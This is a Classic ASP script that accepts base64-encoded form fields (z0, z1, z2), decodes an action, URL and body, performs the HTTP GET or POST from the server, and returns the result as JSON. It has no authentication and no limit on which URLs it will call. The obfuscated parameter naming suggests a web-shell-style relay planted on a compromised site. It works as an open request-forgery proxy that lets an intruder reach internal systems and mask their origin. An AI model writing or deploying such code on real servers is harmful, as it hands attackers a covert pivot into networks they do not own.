<%

Response.ContentType = "application/json"

Function HttpGet(url, ByRef httpCode)

    Dim http
    Set http = Server.CreateObject("MSXML2.ServerXMLHTTP.6.0")

    On Error Resume Next

    http.Open "GET", url, False
    http.setRequestHeader "User-Agent", "ClassicASP"
    http.Send

    If Err.Number <> 0 Then
        httpCode = 0
        HttpGet = ""
        Err.Clear
    Else
        httpCode = http.Status
        HttpGet = http.responseText
    End If

    On Error GoTo 0
    Set http = Nothing

End Function

Function HttpPost(url, data, ByRef httpCode)

    Dim http
    Set http = Server.CreateObject("MSXML2.ServerXMLHTTP.6.0")

    On Error Resume Next

    http.Open "POST", url, False
    http.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
    http.setRequestHeader "Content-Length", Len(data)
    http.Send data

    If Err.Number <> 0 Then
        httpCode = 0
        HttpPost = ""
        Err.Clear
    Else
        httpCode = http.Status
        HttpPost = http.responseText
    End If

    On Error GoTo 0

    Set http = Nothing

End Function

Function Base64Decode(str)

    Dim xml, node, stm

    Set xml = Server.CreateObject("MSXML2.DOMDocument")
    Set node = xml.createElement("base64")

    node.dataType = "bin.base64"
    node.text = str

    Set stm = Server.CreateObject("ADODB.Stream")

    stm.Type = 1
    stm.Open
    stm.Write node.nodeTypedValue
    stm.Position = 0

    stm.Type = 2
    stm.Charset = "utf-8"

    Base64Decode = stm.ReadText

    stm.Close

    Set stm = Nothing
    Set node = Nothing
    Set xml = Nothing

End Function

Function JsonEscape(str)

    If IsNull(str) Then str = ""

    str = Replace(str, "\", "\\")
    str = Replace(str, """", "\""")
    str = Replace(str, vbCrLf, "\n")
    str = Replace(str, vbCr, "\n")
    str = Replace(str, vbLf, "\n")

    JsonEscape = str

End Function

Dim action
action = LCase(Base64Decode(Request.Form("z0")))

Dim httpCode
Dim body
Dim url
Dim data
Dim result

Select Case action
    Case "get"
        url = Base64Decode(Request.Form("z1"))
        If url = "" Then
            result = _
            "{""status"":""error""," & _
            """action"":""get""," & _
            """http_code"":null," & _
            """data"":""Missing URL""}"
        Else
            body = HttpGet(url, httpCode)
            result = _
            "{""status"":""ok""," & _
            """action"":""get""," & _
            """http_code"":" & httpCode & "," & _
            """data"":""" & JsonEscape(body) & """}"
        End If
    Case "post"
        url = Base64Decode(Request.Form("z1"))
        data = Base64Decode(Request.Form("z2"))

        If url = "" Then
            result = _
            "{""status"":""error""," & _
            """action"":""post""," & _
            """http_code"":null," & _
            """data"":""Missing URL""}"
        Else
            body = HttpPost(url, data, httpCode)
            result = _
            "{""status"":""ok""," & _
            """action"":""post""," & _
            """http_code"":" & httpCode & "," & _
            """data"":""" & JsonEscape(body) & """}"
        End If
    Case Else
        result = _
        "{""status"":""error""," & _
        """action"":""" & JsonEscape(action) & """," & _
        """http_code"":null," & _
        """data"":""Invalid action""}"
End Select

Response.Write result

%>